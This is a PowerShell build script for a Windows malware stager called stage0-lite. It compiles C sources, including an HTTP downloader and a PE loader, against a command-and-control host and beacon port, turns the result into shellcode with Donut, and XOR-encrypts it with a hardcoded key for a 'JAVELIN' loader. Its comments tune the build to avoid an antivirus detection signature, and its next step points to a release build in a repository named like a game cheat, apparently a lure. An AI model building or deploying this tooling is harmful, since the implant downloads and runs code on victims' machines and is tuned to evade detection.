# build.ps1 - Build stage0-lite shellcode natively on Windows
#
# Pipeline:
#   1.  Compile stage0_lite.c -> stage0_lite.exe  (mingw-w64 native Windows gcc)
#   2.  Convert exe -> shellcode with donut.exe   (bundled in donut_v1.1/)
#   3.  XOR-encrypt shellcode for JAVELIN         (pure PowerShell)
#   4.  Copy artefacts to dist/
#
# Usage:
#   build.ps1 -Ip 45.154.98.72 -Port 4444
#   build.ps1 -Ip 45.154.98.72 -Port 4444 -ApiPort 5555 -Production
#
# Output:
#   dist\stage0_lite.exe          EXE (debug reference)
#   dist\stage0_lite.bin          raw Donut shellcode  <- feed to build_release.ps1
#   dist\stage0_lite.bin.enc      XOR-encrypted shellcode (for JAVELIN)

param(
    [string]$Ip         = "CHANGEME_C2_HOST",
    [int]   $Port       = 4444,
    [int]   $ApiPort    = 5555,
    [switch]$Production
)

$ErrorActionPreference = "Stop"

$ScriptDir = $PSScriptRoot
$RepoRoot  = Resolve-Path (Join-Path $ScriptDir "..\..")
$SrcDir    = Join-Path $ScriptDir "src"
$BuildDir  = Join-Path $ScriptDir "build"
$DistDir   = Join-Path $RepoRoot  "dist"

Write-Host ""
Write-Host "#===========================================" -ForegroundColor Cyan
Write-Host "#  stage0-lite Builder  (Windows native)   " -ForegroundColor Cyan
Write-Host "#===========================================" -ForegroundColor Cyan
Write-Host " C2 Host  : $Ip"
Write-Host " C2 Port  : $Port  (TLS beacon)"
Write-Host " API Port : $ApiPort (HTTP DLL download)"
$modeStr = if ($Production) { "PRODUCTION" } else { "DEV" }
Write-Host " Mode     : $modeStr"
Write-Host ""

# ---------------------------------------------------------------------------
# 1. Find gcc (mingw-w64 native Windows)
# ---------------------------------------------------------------------------

$GccCandidates = @(
    "C:\ProgramData\mingw64\mingw64\bin\gcc.exe",
    "C:\msys64\mingw64\bin\gcc.exe",
    "C:\msys64\ucrt64\bin\gcc.exe",
    "C:\mingw64\bin\gcc.exe",
    "C:\mingw32\bin\gcc.exe"
)

$Gcc = $null
foreach ($c in $GccCandidates) {
    if (Test-Path $c) { $Gcc = $c; break }
}
if (-not $Gcc) {
    $gcCmd = Get-Command gcc -ErrorAction SilentlyContinue
    if ($gcCmd) { $Gcc = $gcCmd.Source }
}
if (-not $Gcc) {
    Write-Host "ERROR: gcc not found. Install mingw-w64 (winlibs or MSYS2)." -ForegroundColor Red
    exit 1
}
Write-Host "Compiler: $Gcc" -ForegroundColor Green

# ---------------------------------------------------------------------------
# 2. Compile
# ---------------------------------------------------------------------------

New-Item -ItemType Directory -Path $BuildDir -Force | Out-Null

$ExePath = Join-Path $BuildDir "stage0_lite.exe"

$Srcs = @(
    (Join-Path $SrcDir "stage0_lite.c"),
    (Join-Path $SrcDir "winhttp_dl.c"),
    (Join-Path $SrcDir "pe_loader.c")
)

$CFlags = @(
    "-Os",
    "-fno-stack-protector",
    "-fno-exceptions",
    "-fno-asynchronous-unwind-tables",
    "-ffunction-sections",
    "-fdata-sections",
    "-Wall",
    "-Wextra",
    "-I$SrcDir",
    "-DC2_HOST_STR=\`"$Ip\`"",
    "-DC2_PORT=$Port",
    "-DAPI_PORT=$ApiPort"
)

$LdFlags = @(
    "-Wl,--gc-sections",
    "-Wl,--strip-all",
    "-Wl,--no-seh",
    "-lwinhttp",
    "-lkernel32",
    "-luser32"
)

if ($Production) {
    $CFlags  += "-DNDEBUG"
    $LdFlags += "-mwindows"
} else {
    $CFlags += "-DSTAGE0_CONSOLE"
}

$CompileArgs = $CFlags + $Srcs + @("-o", $ExePath) + $LdFlags

Write-Host ""
Write-Host "[1/4] Compiling stage0_lite.exe ..." -ForegroundColor Yellow
Write-Host "  cmd: gcc $($CompileArgs -join ' ')" -ForegroundColor DarkGray

& $Gcc @CompileArgs

if ($LASTEXITCODE -ne 0) {
    Write-Host "COMPILE FAILED (exit $LASTEXITCODE)" -ForegroundColor Red
    exit $LASTEXITCODE
}

$ExeKB = [math]::Round((Get-Item $ExePath).Length / 1KB, 1)
Write-Host "  -> $ExePath ($ExeKB KB)" -ForegroundColor Green

# ---------------------------------------------------------------------------
# 3. Donut -> shellcode
# ---------------------------------------------------------------------------

$DonutExe = Join-Path $RepoRoot "donut_v1.1\donut.exe"
if (-not (Test-Path $DonutExe)) {
    Write-Host "ERROR: donut.exe not found at $DonutExe" -ForegroundColor Red
    exit 1
}

$ScPath = Join-Path $BuildDir "stage0_lite.bin"

Write-Host ""
Write-Host "[2/4] Converting to PIC shellcode with Donut ..." -ForegroundColor Yellow

# -t runs stage0 in its own thread (separate stack) to avoid stack overflow in
# the JAVELIN thread. ESTER keeps the process alive via an infinite loop, so
# the Donut shellcode returning from stage0 startup does not kill the process.
# -x 1 = ExitThread (not ExitProcess) if stage0's entry point ever returns.
# -b 1 = No AMSI/WLDP bypass: stage0_lite.exe is a native C PE (not .NET),
# AMSI patching is unnecessary and triggers Behavior:Win32/AMSI_Patch_T.B12
& $DonutExe -i $ExePath -o $ScPath -a 2 -f 1 -b 1 -x 1 -e 3 -t

if ($LASTEXITCODE -ne 0) {
    Write-Host "DONUT FAILED (exit $LASTEXITCODE)" -ForegroundColor Red
    exit $LASTEXITCODE
}

$ScKB = [math]::Round((Get-Item $ScPath).Length / 1KB, 1)
Write-Host "  -> $ScPath ($ScKB KB)" -ForegroundColor Green

# ---------------------------------------------------------------------------
# 4. XOR-encrypt for JAVELIN embedding
# ---------------------------------------------------------------------------

Write-Host ""
Write-Host "[3/4] XOR-encrypting shellcode for JAVELIN ..." -ForegroundColor Yellow

# Must match JAVELIN_STAGE0_XOR_KEY in stage_builder.rs
$XorKey   = [System.Text.Encoding]::ASCII.GetBytes("C2R2_JAVELIN_STAGE0_KEY_2026_!!!!")
$ScBytes  = [System.IO.File]::ReadAllBytes($ScPath)
$EncBytes = New-Object byte[] $ScBytes.Length

for ($i = 0; $i -lt $ScBytes.Length; $i++) {
    $EncBytes[$i] = $ScBytes[$i] -bxor $XorKey[$i % $XorKey.Length]
}

$EncPath = Join-Path $BuildDir "stage0_lite.bin.enc"
[System.IO.File]::WriteAllBytes($EncPath, $EncBytes)

$EncKB = [math]::Round((Get-Item $EncPath).Length / 1KB, 1)
Write-Host "  -> $EncPath ($EncKB KB)" -ForegroundColor Green

# ---------------------------------------------------------------------------
# 5. Copy to dist/
# ---------------------------------------------------------------------------

Write-Host ""
Write-Host "[4/4] Copying artefacts to dist\ ..." -ForegroundColor Yellow

New-Item -ItemType Directory -Path $DistDir -Force | Out-Null

Copy-Item $ExePath  (Join-Path $DistDir "stage0_lite.exe")     -Force
Copy-Item $ScPath   (Join-Path $DistDir "stage0_lite.bin")     -Force
Copy-Item $EncPath  (Join-Path $DistDir "stage0_lite.bin.enc") -Force
Write-Host "  dist\stage0_lite.exe     : $ExeKB KB" -ForegroundColor Green
Write-Host "  dist\stage0_lite.bin     : $ScKB KB" -ForegroundColor Green
Write-Host "  dist\stage0_lite.bin.enc : $EncKB KB" -ForegroundColor Green

$JavelinPayload = Join-Path $RepoRoot "stages\javelin\src\stage0_payload.bin"
if (Test-Path (Split-Path $JavelinPayload)) {
    Copy-Item $EncPath $JavelinPayload -Force
    Write-Host "  stages\javelin\src\stage0_payload.bin : copied" -ForegroundColor Green
}

Write-Host ""
Write-Host "#===========================================" -ForegroundColor Green
Write-Host "#  stage0-lite build complete!             " -ForegroundColor Green
Write-Host "#===========================================" -ForegroundColor Green
Write-Host ""
if ($ScKB -gt 200) {
    Write-Host "WARNING: shellcode is $ScKB KB (target <200 KB)" -ForegroundColor Yellow
} else {
    Write-Host "OK: size check passed ($ScKB KB < 200 KB)" -ForegroundColor Green
}
Write-Host ""
Write-Host "Next step:" -ForegroundColor Cyan
Write-Host "  cd E:\repos\CS2_EXTERNAL_RADAR_ED_PORPOSES" -ForegroundColor White
Write-Host "  .\build_release.ps1 -Shellcode `"$DistDir\stage0_lite.bin`"" -ForegroundColor White
Write-Host ""
